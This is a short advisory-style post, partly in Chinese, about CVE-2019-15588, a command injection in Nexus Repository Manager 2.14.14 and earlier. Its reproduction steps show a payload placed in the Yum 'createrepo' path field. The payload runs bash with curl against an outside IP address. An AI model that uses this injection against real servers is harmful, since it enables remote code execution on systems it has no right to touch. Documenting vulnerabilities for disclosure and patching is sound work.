CVE-2019-15588 There is an OS Command Injection in Nexus Repository Manager <= 2.14.14 (bypass CVE-2019-5475) that could allow an attacker a Remote Code Execution (RCE). All instances using CommandLineExecutor.java with user-supplied data is vulnerable,... cve.mitre.org/cgi-bin/cvenam…

以上是cve消息，是知道创宇badcode大佬刷hackerone的时候提交的cve

复现的步骤是

Navigate to "Capabilities" in Nexus Repository Manager.

Edit or create a new Yum: Configuration capability

Set path of "createrepo" or "mergerepo" to an OS command (e.g. /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo)
